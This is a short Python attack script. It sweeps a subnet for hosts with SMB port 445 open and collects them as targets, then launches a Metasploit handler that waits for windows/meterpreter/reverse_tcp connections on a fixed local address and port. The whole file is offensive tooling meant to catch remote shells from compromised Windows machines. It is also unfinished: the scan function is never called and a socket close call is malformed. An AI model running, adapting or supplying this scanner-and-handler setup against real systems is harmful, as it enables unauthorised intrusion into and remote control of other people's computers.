#!/usr/bin/python
import socket as sk
import subprocess, shlex
 
### Variables
targets = []
payload = 'windows/meterpreter/reverse_tcp'
 
 
### Scans target network for open port 445
def scanner(ipsub, ipnet1, ipnet2, portrange):
        for octect in range(ipnet1,ipnet2):
                test = ipsub + '.' + str(octect)
                for port in range(portrange, portrange + 1):
                        try:
                               
                                network = ipsub + '.' + str(octect)
                               
                                s=sk.socket(sk.AF_INET, sk.SOCK_STREAM)
                                s.settimeout(1)
                                s.connect((network, port))
                                targets.append(network)
                                s.close
                        except: continue
 
### Starts MSF Handler
def msfhandler():
        print('Starting Handler')
        handler = subprocess.Popen(shlex.split('gnome-terminal -x msfcli exploit/multi/handler payload=windows/meterpreter/reverse_tcp lhost=192.168.1.7 lport=1337 E'))
       
 
msfhandler()
